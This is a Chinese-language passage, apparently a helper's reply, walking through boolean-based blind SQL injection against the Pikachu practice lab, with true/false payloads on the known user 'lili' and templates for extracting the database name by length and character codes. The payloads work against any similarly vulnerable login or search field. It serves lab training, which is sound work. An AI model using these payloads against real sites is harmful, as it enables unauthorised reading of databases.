那就说明：**不能用空字符串去 or，必须拿一个真实存在的用户名当起点！！**
Pikachu 这张 users 表内置合法账号：`lili`、`kobe`、`lucy`、`root`、`admin`

## 用已知存在用户做布尔判断（正确起点 Payload）

输入框提交：

```
lili' and 1=1#
```

拼接 SQL：

```
select * from users where name='lili' and 1=1#'
```

- 如果 lili 真实存在 →条件 True →**不存在提示消失**

再提交假条件对比：

```
lili' and 1=2#
```

- False →页面**出现不存在提示**

> 
> 这就是布尔盲注最标准的对照！
> `and` 模式：必须基于一个真实存在的用户，再追加判断条件，**这就是你前面一直失败的根本原因！**
> 你之前 `admin' and 1=1` 失败，大概率数据库没有 admin 账号，但是一定有`lili`。

---

# 验证真假的对照实验（直接复制到输入框）

### 测试 1‑真条件

```
lili' and 1=1#
```

👉页面文字消失 = True 通道打通！！

### 测试 2‑假条件

```
lili' and 1=2#
```

👉页面出现 “不存在” = False

只要上面两个出现**页面差异**，布尔盲注就可以开始跑库名，后续所有 payload 模板：

```
lili' and length(database())=7#
lili' and ascii(substr(database(),1,1))>100#
```


